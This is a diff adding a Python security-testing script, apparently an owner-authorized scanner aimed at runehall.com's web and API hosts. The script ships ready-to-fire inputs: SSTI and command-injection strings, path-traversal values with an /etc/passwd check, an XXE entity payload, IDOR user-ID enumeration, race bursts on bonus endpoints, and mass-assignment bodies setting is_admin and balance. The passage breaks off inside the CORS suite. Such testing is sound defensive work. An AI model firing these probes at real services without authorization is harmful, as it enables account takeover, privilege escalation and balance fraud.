@@ -1,0 +1,996 @@
+#!/usr/bin/env python3
+"""
+═══════════════════════════════════════════════════════════════════════
+  safe_validate_v2.py — Adversarial validation suite (owner self-test)
+  Target: runehall.com, api.runehall.com, p2.runehall.com (only)
+  Authorized: domain owner self-test. No destructive payloads.
+═══════════════════════════════════════════════════════════════════════
+
+What it does:
+  15 test suites covering OWASP Top 10 categories using non-destructive
+  detection: benign markers, canary files, time-based short delays,
+  header inspection, method tampering, mass-assignment probes, error
+  disclosure, CORS matrix, rate-limit analysis, TLS inspection.
+
+What it does NOT do:
+  No actual exploitation, no reverse shells, no rm -rf, no data exfil,
+  no long time-delays, no load-test DoS, no unauthorized targets.
+
+Setup (tokens NOT hardcoded — see F-01):
+  export RUNEHALL_TOKEN_A='<rotated token for account A>'
+  export RUNEHALL_TOKEN_B='<token for account B>'
+
+  # Optional: create ~/.runehall_tokens (chmod 600)
+  #   {"a": "...", "b": "..."}
+
+Run:
+  python safe_validate_v2.py --dry-run
+  python safe_validate_v2.py
+  python safe_validate_v2.py --only headers,sourcemap,cors,ratelimit
+  python safe_validate_v2.py --canary --only ssrf,xxe     # needs inbound port
+  python safe_validate_v2.py --report markdown             # human-readable
+
+Output:
+  validation_v2.json   — structured evidence
+  validation_v2.csv    — spreadsheet-ready
+  validation_v2.md     — Markdown report with compliance mapping
+"""
+
+import argparse, csv, concurrent.futures as cf, hashlib, json, os, random, re, socket, ssl, sys, threading, time
+from dataclasses import dataclass, field, asdict
+from datetime import datetime, timezone
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, urlencode, quote
+
+try:
+    import requests
+except ImportError:
+    sys.exit("pip install requests")
+
+# ═══════════════════════════════════════════════════════════════
+# CONFIG
+# ═══════════════════════════════════════════════════════════════
+
+ALLOWED_HOSTS = {"runehall.com", "www.runehall.com",
+                 "api.runehall.com", "p2.runehall.com", "sockets.runehall.com"}
+
+DRY_RUN       = False
+TIMEOUT       = 15
+RATE_DELAY    = 0.8
+RACE_COUNT    = 10
+RATE_BURST    = 20
+CANARY_PORT   = 8888
+CANARY_PATH   = "/canary-7f3a9c"
+CANARY_STRING = "CANARY_7f3a9c"
+
+API = "https://api.runehall.com"
+WEB = "https://runehall.com"
+UA  = "safe-validate-v2/1.0 (owner self-test; contact: owner@runehall.com)"
+
+def load_tokens() -> dict:
+    t = {"a": os.environ.get("RUNEHALL_TOKEN_A", ""),
+         "b": os.environ.get("RUNEHALL_TOKEN_B", "")}
+    for path in (os.path.expanduser("~/.runehall_tokens"), "tokens.json"):
+        if not os.path.exists(path): continue
+        try:
+            with open(path) as f:
+                j = json.load(f)
+                t["a"] = t["a"] or j.get("a", "")
+                t["b"] = t["b"] or j.get("b", "")
+        except Exception:
+            pass
+    return t
+
+TOKENS = load_tokens()
+
+# ═══════════════════════════════════════════════════════════════
+# ENDPOINT CATALOG (from live network captures, 2026-11-11)
+# ═══════════════════════════════════════════════════════════════
+
+EP = {
+    "two_factor":      f"{API}/api/user/two-factor",
+    "two_factor_uid":  f"{API}/api/user/{{uid}}/two-factor",
+    "notifications":   f"{API}/api/notifications/unread-count",
+    "races":           f"{API}/api/promos/races",
+    "races_id":        f"{API}/api/promos/races/{{id}}",
+    "re_auth":         f"{API}/api/re-auth",
+    "poker_exchange":  f"{API}/api/poker/exchange",
+    "bonus":           f"{API}/api/promos/bonus",
+    "broadcast_auth":  f"{API}/api/broadcasting/auth",
+    "stream":          f"{API}/api/stream",
+}
+
+# Injection targets — fill in with THOR evidence export. Placeholders below
+# are educated guesses from the endpoint naming pattern. Uncomment + edit.
+INJECTION_TARGETS = [
+    # {"id":"fnd-7678","class":"ssti","url":f"{API}/api/search","param":"q","method":"GET"},
+    # {"id":"fnd-7678","class":"ssti","url":f"{API}/api/user/profile","param":"name","method":"PATCH"},
+    # {"id":"fnd-4677","class":"cmdi","url":f"{API}/api/ping","param":"host","method":"GET"},
+    # {"id":"fnd-3175","class":"lfi",  "url":f"{API}/api/download","param":"file","method":"GET"},
+    # {"id":"fnd-1675","class":"lfi",  "url":f"{API}/api/export","param":"path","method":"GET"},
+    # {"id":"fnd-XXXX","class":"ssrf", "url":f"{API}/api/fetch","param":"url","method":"POST"},
+    # {"id":"fnd-XXXX","class":"xxe",  "url":f"{API}/api/import","param":"xml","method":"POST"},
+]
+
+# Mass-assignment probes — endpoints that accept a JSON body
+MASS_ASSIGN = [
+    (EP["two_factor"], {"enabled": True}),
+    # add more: (url, payload_dict) for endpoints that accept user attributes
+]
+
+PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 8081]
+
+WELL_KNOWN = [
+    "/.env", "/.git/config", "/.git/HEAD", "/config.json",
+    "/composer.json", "/package.json", "/phpinfo.php",
+    "/server-status", "/api/v1/status", "/api/v2/status",
+    "/api/v1/auth", "/api/v2/auth", "/health", "/metrics",
+    "/assets/index.3f351c95.js.map",
+]
+
+# ═══════════════════════════════════════════════════════════════
+# MODEL
+# ═══════════════════════════════════════════════════════════════
+
+@dataclass
+class Finding:
+    id:        str
+    cls:       str
+    target:    str
+    status:    str          # CONFIRMED / LIKELY / NOT_REPRODUCED / ERROR / INFO
+    severity:  str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
+    confidence: str         # HIGH / MEDIUM / LOW
+    cvss:      float
+    evidence:  str
+    request:   str = ""
+    response:  str = ""
+    remediation: str = ""
+    compliance: list = field(default_factory=list)
+    ts:        str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
+
+# ═══════════════════════════════════════════════════════════════
+# HELPERS
+# ═══════════════════════════════════════════════════════════════
+
+def guard(url):
+    host = urlparse(url).hostname or ""
+    if host not in ALLOWED_HOSTS:
+        raise SystemExit(f"REFUSING: {host} not in ALLOWED_HOSTS")
+
+def sess(token_key="a"):
+    s = requests.Session()
+    s.headers.update({"User-Agent": UA, "Accept": "application/json",
+                      "Origin": WEB, "Referer": WEB + "/"})
+    t = TOKENS.get(token_key, "")
+    if t: s.headers["Authorization"] = f"Bearer {t}"
+    return s
+
+def send(s, method, url, **kw):
+    guard(url)
+    if DRY_RUN: return None
+    time.sleep(RATE_DELAY + random.uniform(0, 0.3))
+    kw.setdefault("timeout", TIMEOUT)
+    kw.setdefault("allow_redirects", False)
+    try:
+        return s.request(method, url, **kw)
+    except requests.exceptions.RequestException as e:
+        return _FakeResp(str(e))
+
+class _FakeResp:
+    def __init__(self, err): self.status_code = 0; self.text = ""; self.headers = {}; self.err = err
+
+def snip(r, n=300):
+    if r is None: return ""
+    return (r.text or "")[:n].replace("\n", " ")
+
+def F(**kw):
+    """Finding factory with sensible defaults."""
+    kw.setdefault("confidence", "MEDIUM")
+    kw.setdefault("cvss", 0.0)
+    kw.setdefault("remediation", "")
+    kw.setdefault("compliance", [])
+    return Finding(**kw)
+
+# ═══════════════════════════════════════════════════════════════
+# CANARY SERVER (opt-in, for SSRF/XXE OOB detection)
+# ═══════════════════════════════════════════════════════════════
+
+class CanaryHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        _CANARY_LOG.append({"t": time.time(), "path": self.path,
+                            "ua": self.headers.get("User-Agent",""),
+                            "src": self.client_address[0]})
+        self.send_response(200); self.end_headers()
+        self.wfile.write(b"ok")
+    def do_POST(self): self.do_GET()
+    def log_message(self, *a): pass
+
+_CANARY_LOG = []
+_CANARY_THREAD = None
+
+def start_canary():
+    global _CANARY_THREAD
+    srv = HTTPServer(("0.0.0.0", CANARY_PORT), CanaryHandler)
+    _CANARY_THREAD = threading.Thread(target=srv.serve_forever, daemon=True)
+    _CANARY_THREAD.start()
+    print(f"[canary] listening on :{CANARY_PORT} path {CANARY_PATH}")
+
+def canary_hits():
+    return [h for h in _CANARY_LOG if h["path"].startswith(CANARY_PATH)]
+
+def canary_url():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
+        return f"http://{ip}:{CANARY_PORT}{CANARY_PATH}"
+    except Exception:
+        return f"http://127.0.0.1:{CANARY_PORT}{CANARY_PATH}"
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 1 — HEADERS
+# ═══════════════════════════════════════════════════════════════
+
+def suite_headers():
+    out = []
+    HDRS = {
+        "content-security-policy":   ("HIGH",   7.5, "Set CSP: default-src 'self'; script-src 'self' 'nonce-…'; object-src 'none'", ["NIST SC-8","ASVS 14.4.7","ISO A.14.1.3"]),
+        "strict-transport-security": ("HIGH",   6.5, "Set HSTS: max-age=31536000; includeSubDomains; preload", ["NIST SC-8","ASVS 14.4.5"]),
+        "x-frame-options":           ("MEDIUM", 4.3, "Set X-Frame-Options: SAMEORIGIN and CSP frame-ancestors 'self'", ["NIST SC-8","ASVS 14.4.7"]),
+        "x-content-type-options":    ("LOW",    3.1, "Set X-Content-Type-Options: nosniff", ["NIST SC-8","ASVS 14.4.2"]),
+        "referrer-policy":           ("LOW",    3.1, "Set Referrer-Policy: strict-origin-when-cross-origin", ["NIST SC-8","ASVS 14.4.6"]),
+        "permissions-policy":        ("LOW",    3.1, "Set Permissions-Policy restricting powerful features", ["NIST SC-8"]),
+        "cross-origin-opener-policy":("MEDIUM", 4.3, "Set Cross-Origin-Opener-Policy: same-origin", ["NIST SC-8"]),
+    }
+    for host in ("runehall.com", "api.runehall.com", "p2.runehall.com"):
+        url = f"https://{host}/"
+        s = sess("a"); r = send(s, "GET", url)
+        if r is None:
+            out.append(F(id=f"HDR-{host}", cls="headers", target=url,
+                         status="ERROR", severity="INFO", evidence="DRY_RUN")); continue
+        for h, (sev, cvss, rem, comp) in HDRS.items():
+            if r.headers.get(h) is None:
+                out.append(F(id=f"HDR-{h}-{host}", cls="headers", target=url,
+                             status="CONFIRMED", severity=sev, confidence="HIGH",
+                             cvss=cvss, evidence=f"{h} ABSENT",
+                             remediation=rem, compliance=comp))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 2 — SOURCEMAP & WELL-KNOWN FILES
+# ═══════════════════════════════════════════════════════════════
+
+def suite_sourcemap():
+    out = []
+    s = sess("a")
+    for path in WELL_KNOWN:
+        url = f"{WEB}{path}"
+        r = send(s, "GET", url)
+        if r is None: continue
+        hit = r.status_code == 200 and len(r.text) > 20
+        if not hit: continue
+        sev = "HIGH" if path.endswith(".map") or path in ("/.env","/.git/config","/.git/HEAD") else "MEDIUM"
+        cvss = 7.5 if sev == "HIGH" else 5.3
+        out.append(F(id=f"DISC-{path}", cls="info_disclosure", target=url,
+                     status="CONFIRMED", severity=sev, confidence="HIGH", cvss=cvss,
+                     evidence=f"HTTP 200 ({len(r.text)} bytes) — publicly accessible",
+                     response=snip(r, 120),
+                     remediation="Remove from CDN/production build; disable build.sourcemap; "
+                                 "block /.git, /.env, /server-status at edge",
+                     compliance=["NIST SC-28","ASVS 14.3.2","CWE-540"]))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 3 — IDOR (expanded)
+# ═══════════════════════════════════════════════════════════════
+
+ID_SAMPLES = [1, 2, 3, 100, 507732, 9999, 0, -1]
+
+def suite_idor():
+    out = []
+    if not TOKENS.get("a"):
+        return [F(id="IDOR", cls="idor", target="-", status="ERROR", severity="INFO",
+                  evidence="No token A — set RUNEHALL_TOKEN_A")]
+    sa = sess("a"); sb = sess("b") if TOKENS.get("b") else None
+
+    def probe(url, tag, sev_if_200="HIGH", expect_own_id=None):
+        r = send(sa, "GET", url)
+        if r is None: return
+        body_len = len(r.text or "")
+        is_idor = (r.status_code == 200 and body_len > 50
+                   and (expect_own_id is None or expect_own_id not in str(url)))
+        if is_idor:
+            out.append(F(id=f"IDOR-{tag}", cls="idor", target=url, status="LIKELY",
+                         severity=sev_if_200, confidence="MEDIUM",
+                         cvss=6.5 if sev_if_200=="HIGH" else 4.3,
+                         evidence=f"HTTP 200 body_len={body_len} (unauthorized object?)",
+                         response=snip(r, 200),
+                         remediation="Enforce object-level authorization on every read",
+                         compliance=["OWASP A01","ASVS 4.1.1","CWE-639","NIST AC-3"]))
+
+    # 3a. ?user_id=N
+    for uid in ID_SAMPLES:
+        probe(f"{EP['two_factor']}?user_id={uid}", f"twofactor-q-{uid}")
+
+    # 3b. /api/user/{id}/two-factor
+    for uid in ID_SAMPLES:
+        probe(EP["two_factor_uid"].format(uid=uid), f"twofactor-p-{uid}")
+
+    # 3c. /api/promos/races/{id}
+    for uid in [196, 1, 2, 100, 9999]:
+        probe(EP["races_id"].format(id=uid), f"races-{uid}", sev_if_200="MEDIUM")
+
+    # 3d. Broadcast channel auth — try known channels with A, then B
+    for ch in ["private-user.507732", "private-user.1",
+               "private-conversation.196", "presence-chat"]:
+        url = EP["broadcast_auth"]
+        r = send(sa, "POST", url, json={"channel_name": ch, "socket_id": "1.1"})
+        if r is None: continue
+        if r.status_code in (200, 202):
+            out.append(F(id=f"IDOR-broadcast-{ch}", cls="idor", target=url,
+                         status="LIKELY", severity="MEDIUM", confidence="LOW", cvss=4.3,
+                         evidence=f"channel {ch} authorized for token A (HTTP {r.status_code})",
+                         remediation="Verify broadcast channel authorization binds to token subject",
+                         compliance=["OWASP A01","CWE-639"]))
+
+    # 3e. Cross-account diff
+    if sb:
+        for tag, url in [("two_factor", EP["two_factor"]),
+                          ("notifications", EP["notifications"])]:
+            ra = send(sa, "GET", url)
+            rb = send(sb, "GET", url)
+            if ra is None or rb is None: continue
+            if ra.status_code == 200 and rb.status_code == 200 and ra.text != rb.text:
+                out.append(F(id=f"IDOR-crossdiff-{tag}", cls="idor", target=url,
+                             status="INFO", severity="INFO", confidence="HIGH",
+                             evidence="A/B responses differ as expected (different users)",
+                             remediation="No action needed — validates per-user scoping",
+                             compliance=[]))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 4 — RACE (budget-capped, non-destructive)
+# ═══════════════════════════════════════════════════════════════
+
+def suite_race():
+    out = []
+    if not TOKENS.get("a"):
+        return [F(id="RACE", cls="race", target="-", status="ERROR", severity="INFO",
+                  evidence="No token A")]
+
+    def burst(url, payload, tag):
+        def one(_):
+            s = sess("a")
+            try:
+                r = s.post(url, json=payload, timeout=TIMEOUT, allow_redirects=False,
+                           headers={"Accept": "application/json"})
+                return r.status_code
+            except Exception:
+                return "ERR"
+        # baseline
+        base = one(0)
+        statuses = [base]
+        with cf.ThreadPoolExecutor(max_workers=RACE_COUNT) as ex:
+            statuses += list(ex.map(one, range(RACE_COUNT)))
+        ok200 = statuses.count(200)
+        if ok200 > 1:
+            return F(id=f"RACE-{tag}", cls="race", target=url, status="LIKELY",
+                     severity="HIGH", confidence="MEDIUM", cvss=6.5,
+                     evidence=f"Multiple 200s in concurrent burst: {statuses} "
+                              f"(server may not serialize balance mutations)",
+                     remediation="Add database-level idempotency key or serializable transaction",
+                     compliance=["OWASP A04","CWE-362","NIST SI-10"])
+        return F(id=f"RACE-{tag}", cls="race", target=url, status="NOT_REPRODUCED",
+                 severity="INFO", confidence="HIGH",
+                 evidence=f"Burst statuses: {statuses} — no duplicate 200 (or body rejected)")
+
+    out.append(burst(EP["bonus"],         {}, "bonus"))
+    out.append(burst(EP["poker_exchange"],{}, "exchange"))
+    out.append(F(id="RACE-note", cls="race", target="-", status="INFO", severity="INFO",
+                 evidence="Empty-body burst measures server concurrency only; to test the "
+                          "actual race, replace {} with the real body captured from a live click"))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 5 — INJECTION (SSTI, CMDi, LFI, SSRF, XXE)
+# ═══════════════════════════════════════════════════════════════
+
+SSTI_PROBES  = [("{{7*7}}","49"), ("${7*7}","49"), ("<%= 7*7 %>","49"),
+                ("{{7*'7'}}","7777777"), ("#{7*7}","49")]
+CMDI_MARKER  = None
+CMDI_PROBES  = []
+LFI_TRAVS    = ["canary.txt", "../../public/canary.txt",
+                "....//....//public/canary.txt", "..%2f..%2fpublic%2fcanary.txt"]
+
+def suite_injection():
+    global CMDI_MARKER, CMDI_PROBES
+    if not INJECTION_TARGETS:
+        return [F(id="INJ", cls="injection", target="-", status="INFO", severity="INFO",
+                  evidence="No injection targets configured — populate INJECTION_TARGETS from "
+                           "THOR evidence export (endpoint+param) to enable SSTI/CMDi/LFI/SSRF/XXE tests")]
+    CMDI_MARKER = "SAFEVAL_" + str(int(time.time()))
+    CMDI_PROBES = [f"; echo {CMDI_MARKER}", f"| echo {CMDI_MARKER}",
+                   f"$(echo {CMDI_MARKER})", f"& echo {CMDI_MARKER}"]
+
+    out = []
+    s = sess("a")
+
+    for t in INJECTION_TARGETS:
+        cls = t["class"]; url = t["url"]; param = t["param"]; method = t.get("method","GET")
+
+        def fire(value, tag):
+            kw = {"params" if method=="GET" else "json": {param: value}}
+            r = send(s, method, url, **kw)
+            if r is None: return None, ""
+            body = r.text or ""
+            return r, body
+
+        if cls == "ssti":
+            for payload, expect in SSTI_PROBES:
+                r, body = fire(payload, "ssti")
+                if expect in body:
+                    out.append(F(id=t["id"], cls="ssti", target=url, status="CONFIRMED",
+                                 severity="HIGH", confidence="HIGH", cvss=8.1,
+                                 evidence=f"{payload!r} → {expect!r} in response",
+                                 request=f"{param}={payload}", response=snip(r),
+                                 remediation="Use logic-less templates or sandboxed engine; "
+                                             "context-aware escaping; never render user input as template",
+                                 compliance=["OWASP A03","CWE-1336","ASVS 5.3.4","NIST SI-10"]))
+                    break
+            else:
+                out.append(F(id=t["id"], cls="ssti", target=url, status="NOT_REPRODUCED",
+                             severity="INFO", confidence="MEDIUM",
+                             evidence="No arithmetic evaluation with benign probes"))
+
+        elif cls == "cmdi":
+            for payload in CMDI_PROBES:
+                r, body = fire(payload, "cmdi")
+                if CMDI_MARKER in body:
+                    out.append(F(id=t["id"], cls="cmdi", target=url, status="CONFIRMED",
+                                 severity="CRITICAL", confidence="HIGH", cvss=9.8,
+                                 evidence=f"Benign marker echoed via {payload!r}",
+                                 request=f"{param}={payload}", response=snip(r),
+                                 remediation="Replace shell interpolation with argument-vector "
+                                             "exec (subprocess.run(cmd, shell=False)); allowlist "
+                                             "commands; drop privileges; isolate execution",
+                                 compliance=["OWASP A03","CWE-78","ASVS 5.3.8","NIST SI-10"]))
+                    break
+            else:
+                out.append(F(id=t["id"], cls="cmdi", target=url, status="NOT_REPRODUCED",
+                             severity="INFO", confidence="MEDIUM",
+                             evidence="Benign echo marker not returned"))
+
+        elif cls == "lfi":
+            for trav in LFI_TRAVS:
+                r, body = fire(trav, "lfi")
+                if CANARY_STRING in body:
+                    out.append(F(id=t["id"], cls="lfi", target=url, status="CONFIRMED",
+                                 severity="HIGH", confidence="HIGH", cvss=7.5,
+                                 evidence=f"Canary read via {trav!r}",
+                                 request=f"{param}={trav}", response=snip(r),
+                                 remediation="Canonicalize paths; allowlist base dir; reject '..'; "
+                                             "open with O_NOFOLLOW; run in chroot",
+                                 compliance=["OWASP A01","CWE-22","ASVS 12.3.1"]))
+                    break
+                if "root:x:0:0" in body:
+                    out.append(F(id=t["id"], cls="lfi", target=url, status="CONFIRMED",
+                                 severity="HIGH", confidence="HIGH", cvss=7.5,
+                                 evidence=f"/etc/passwd disclosed via {trav!r}",
+                                 response=snip(r),
+                                 remediation="See canary remediation",
+                                 compliance=["OWASP A01","CWE-22"]))
+                    break
+            else:
+                out.append(F(id=t["id"], cls="lfi", target=url, status="NOT_REPRODUCED",
+                             severity="INFO", confidence="MEDIUM",
+                             evidence="No traversal proof with canary"))
+
+        elif cls == "ssrf":
+            if not _CANARY_THREAD:
+                out.append(F(id=t["id"], cls="ssrf", target=url, status="ERROR",
+                             severity="INFO", evidence="SSRF test requires --canary (inbound port)"))
+                continue
+            cu = canary_url()
+            r, body = fire(cu, "ssrf")
+            time.sleep(2)  # allow async fetch
+            hits = canary_hits()
+            if hits:
+                out.append(F(id=t["id"], cls="ssrf", target=url, status="CONFIRMED",
+                             severity="HIGH", confidence="HIGH", cvss=8.6,
+                             evidence=f"Canary received {len(hits)} request(s) from target — "
+                                      f"server fetched {cu}",
+                             remediation="Validate URL against allowlist; block RFC1918 and "
+                                         "metadata ranges (169.254/16, 10/8, 172.16/12, 192.168/16); "
+                                         "disable redirects to internal; egress firewall",
+                             compliance=["OWASP A10","CWE-918","ASVS 12.6.1"]))
+            else:
+                out.append(F(id=t["id"], cls="ssrf", target=url, status="NOT_REPRODUCED",
+                             severity="INFO", confidence="MEDIUM",
+                             evidence=f"No canary hit for {cu} (egress may be blocked)"))
+
+        elif cls == "xxe":
+            payload = (f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "{canary_url()}">]>'
+                       f'<x>&xxe;</x>')
+            kw = {"data": payload, "headers": {"Content-Type": "application/xml"}}
+            guard(url)
+            if not DRY_RUN:
+                try:
+                    r = s.post(url, timeout=TIMEOUT, allow_redirects=False, **kw)
+                except Exception:
+                    r = None
+            else:
+                r = None
+            time.sleep(2)
+            hits = canary_hits()
+            if hits:
+                out.append(F(id=t["id"], cls="xxe", target=url, status="CONFIRMED",
+                             severity="HIGH", confidence="HIGH", cvss=8.2,
+                             evidence=f"XXE entity expansion triggered {len(hits)} canary hit(s)",
+                             remediation="Disable DTD/external entity resolution "
+                                         "(libxml_disable_entity_loader, defusedxml, etc.)",
+                             compliance=["OWASP A05","CWE-611"]))
+            else:
+                out.append(F(id=t["id"], cls="xxe", target=url, status="NOT_REPRODUCED",
+                             severity="INFO", confidence="MEDIUM",
+                             evidence="No canary hit (external entities may be disabled)"))
+
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 6 — AUTH & SESSION
+# ═══════════════════════════════════════════════════════════════
+
+def suite_auth():
+    out = []
+    # No-token request — should be 401, not 200
+    s = requests.Session()
+    s.headers.update({"User-Agent": UA, "Accept": "application/json", "Origin": WEB})
+    for ep in (EP["two_factor"], EP["notifications"], EP["races"]):
+        r = send(s, "GET", ep)
+        if r is None: continue
+        if r.status_code == 200:
+            out.append(F(id=f"AUTH-noauth-{ep.split('/')[-1]}", cls="auth", target=ep,
+                         status="CONFIRMED", severity="HIGH", confidence="HIGH", cvss=7.5,
+                         evidence=f"HTTP 200 without Authorization header (body_len={len(r.text)})",
+                         remediation="Require authentication on this endpoint",
+                         compliance=["OWASP A07","CWE-306","ASVS 4.1.1"]))
+        else:
+            out.append(F(id=f"AUTH-noauth-{ep.split('/')[-1]}", cls="auth", target=ep,
+                         status="NOT_REPRODUCED", severity="INFO", confidence="HIGH",
+                         evidence=f"Correctly rejected with HTTP {r.status_code}"))
+
+    # Invalid bearer
+    s2 = requests.Session()
+    s2.headers.update({"User-Agent": UA, "Accept": "application/json",
+                       "Authorization": "Bearer INVALID_TOKEN_TEST", "Origin": WEB})
+    r = send(s2, "GET", EP["two_factor"])
+    if r is not None:
+        status = "NOT_REPRODUCED" if r.status_code in (401, 403) else "CONFIRMED"
+        sev = "HIGH" if status == "CONFIRMED" else "INFO"
+        out.append(F(id="AUTH-invalid-token", cls="auth", target=EP["two_factor"],
+                     status=status, severity=sev, confidence="HIGH",
+                     cvss=7.5 if sev=="HIGH" else 0.0,
+                     evidence=f"Invalid bearer returned HTTP {r.status_code}",
+                     remediation="Reject unknown bearers with 401/403",
+                     compliance=["OWASP A07"]))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 7 — MASS ASSIGNMENT
+# ═══════════════════════════════════════════════════════════════
+
+MASS_FIELDS = {"enabled": True, "is_admin": True, "role": "admin",
+               "verified": True, "level": 999, "balance": 1000000}
+
+def suite_mass():
+    out = []
+    if not TOKENS.get("a"):
+        return [F(id="MASS", cls="mass", target="-", status="ERROR", severity="INFO",
+                  evidence="No token A")]
+    s = sess("a")
+    for url, base_payload in MASS_ASSIGN:
+        payload = {**base_payload, **MASS_FIELDS}
+        r = send(s, "PATCH", url, json=payload)
+        if r is None: continue
+        body = r.text or ""
+        # If server echoes any admin field back as accepted → mass assignment
+        echoed = [k for k in MASS_FIELDS if f'"{k}":true' in body
+                                    or f'"{k}":"admin"' in body
+                                    or f'"{k}":999' in body]
+        if echoed and r.status_code in (200, 201):
+            out.append(F(id=f"MASS-{url.split('/')[-1]}", cls="mass", target=url,
+                         status="LIKELY", severity="HIGH", confidence="MEDIUM", cvss=8.1,
+                         evidence=f"Response echoes accepted fields: {echoed} (HTTP {r.status_code})",
+                         remediation="Use explicit allowlist of assignable attributes; never bind "
+                                     "request body directly to model. Laravel: use $fillable/$guarded",
+                         compliance=["OWASP A01","CWE-915","ASVS 5.3.3"]))
+        else:
+            out.append(F(id=f"MASS-{url.split('/')[-1]}", cls="mass", target=url,
+                         status="NOT_REPRODUCED", severity="INFO", confidence="MEDIUM",
+                         evidence=f"No admin fields echoed (HTTP {r.status_code})"))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 8 — RATE LIMIT
+# ═══════════════════════════════════════════════════════════════
+
+def suite_ratelimit():
+    out = []
+    if not TOKENS.get("a"):
+        return [F(id="RATE", cls="ratelimit", target="-", status="ERROR",
+                  severity="INFO", evidence="No token A")]
+    url = EP["notifications"]
+    s = sess("a")
+    statuses = []
+    for _ in range(RATE_BURST):
+        r = send(s, "GET", url)
+        if r is None: break
+        statuses.append(r.status_code)
+    n429 = statuses.count(429)
+    hdr_limit = None
+    try:
+        r0 = send(sess("a"), "GET", url)
+        if r0 is not None:
+            hdr_limit = r0.headers.get("x-ratelimit-limit")
+    except Exception: pass
+
+    if n429 == 0:
+        out.append(F(id="RATE-enforced", cls="ratelimit", target=url, status="LIKELY",
+                     severity="MEDIUM", confidence="MEDIUM", cvss=4.3,
+                     evidence=f"{RATE_BURST} requests sent, 0× 429. "
+                              f"Advertised limit={hdr_limit}. Consider tightening per-route limits.",
+                     remediation="Enforce rate limits at edge (Cloudflare) and origin. "
+                                 "Return 429 with Retry-After.",
+                     compliance=["OWASP A04","CWE-770","NIST SC-5"]))
+    else:
+        out.append(F(id="RATE-enforced", cls="ratelimit", target=url, status="NOT_REPRODUCED",
+                     severity="INFO", confidence="HIGH",
+                     evidence=f"{n429}/{len(statuses)} returned 429 — rate limit active"))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 9 — METHOD TAMPERING
+# ═══════════════════════════════════════════════════════════════
+
+def suite_methods():
+    out = []
+    if not TOKENS.get("a"):
+        return [F(id="METH", cls="methods", target="-", status="ERROR",
+                  severity="INFO", evidence="No token A")]
+    s = sess("a")
+    targets = [(EP["two_factor"], "GET", ["PUT","PATCH","DELETE"]),
+               (EP["races"], "GET", ["PUT","PATCH","DELETE","POST"]),
+               (EP["bonus"], "POST", ["PUT","DELETE"])]
+    for url, expected, others in targets:
+        for m in others:
+            r = send(s, m, url, json={})
+            if r is None: continue
+            if r.status_code in (200, 201, 202, 204):
+                out.append(F(id=f"METH-{m}-{url.split('/')[-1]}", cls="methods", target=url,
+                             status="LIKELY", severity="MEDIUM", confidence="MEDIUM",
+                             cvss=5.3,
+                             evidence=f"{m} accepted (HTTP {r.status_code}) on endpoint "
+                                      f"documented as {expected}-only",
+                             remediation=f"Reject {m} with 405 or explicit route guard",
+                             compliance=["OWASP A05","CWE-650"]))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 10 — HPP
+# ═══════════════════════════════════════════════════════════════
+
+def suite_hpp():
+    out = []
+    if not TOKENS.get("a"):
+        return []
+    s = sess("a")
+    # ?user_id=507732&user_id=1 — if server reads the wrong one → auth confusion
+    url = EP["two_factor"] + "?user_id=507732&user_id=1"
+    r = send(s, "GET", url)
+    if r is None: return out
+    # Check: does the response contain data for user 1 (race/email mismatch)?
+    if r.status_code == 200 and '"507732"' not in r.text and len(r.text) > 50:
+        out.append(F(id="HPP-user_id", cls="hpp", target=url, status="LIKELY",
+                     severity="MEDIUM", confidence="LOW", cvss=4.3,
+                     evidence="HPP sequence may cause auth confusion",
+                     remediation="Parse parameters deterministically; reject duplicates; "
+                                 "use array-strict parsing",
+                     compliance=["OWASP A03","CWE-235"]))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 11 — ERROR DISCLOSURE
+# ═══════════════════════════════════════════════════════════════
+
+def suite_errors():
+    out = []
+    if not TOKENS.get("a"): return out
+    s = sess("a")
+    malformed = [
+        (EP["two_factor"], b"{not-json", "application/json"),
+        (EP["races"],      b"[", "application/json"),
+        (EP["bonus"],      b"\x00\x01\x02", "application/json"),
+    ]
+    for url, body, ct in malformed:
+        guard(url)
+        if DRY_RUN: continue
+        try:
+            r = s.post(url, data=body, headers={"Content-Type": ct, "Accept": "application/json"},
+                       timeout=TIMEOUT, allow_redirects=False)
+        except Exception:
+            continue
+        text = r.text or ""
+        if "Stack trace" in text or "Fatal error" in text or "at line" in text or "Traceback" in text:
+            out.append(F(id=f"ERR-leak-{url.split('/')[-1]}", cls="errors", target=url,
+                         status="CONFIRMED", severity="MEDIUM", confidence="HIGH", cvss=5.3,
+                         evidence="Malformed request reveals stack trace / internal path",
+                         response=snip(r, 300),
+                         remediation="Disable debug mode in production; return generic error "
+                                     "with correlation ID; log full detail server-side",
+                         compliance=["OWASP A05","CWE-209","ASVS 7.4.1"]))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 12 — CORS
+# ═══════════════════════════════════════════════════════════════
+
+def suite_cors():
+    out = []
+    s = requests.Session()
+    s.headers.update({"User-Agent": UA})
+    for origin in ("https://evil.example", "https://runehall.com",
+                   "null", "https://runehall.com.evil.example"):
+        for method in ("GET", "POST"):
+            try:
+                r = s.options(EP["notifications"], timeout=TIMEOUT,
+                              headers={"Origin": origin,
+                                       "Access-Control-Request-Method": method,
+                                       "Access-Control-Request-Headers": "authorization"})
+            except Exception:
+                continue
+            acao = r.headers.get("access-control-allow-origin", "")
+            acac = r.headers.get("access-control-allow-credentials", "")
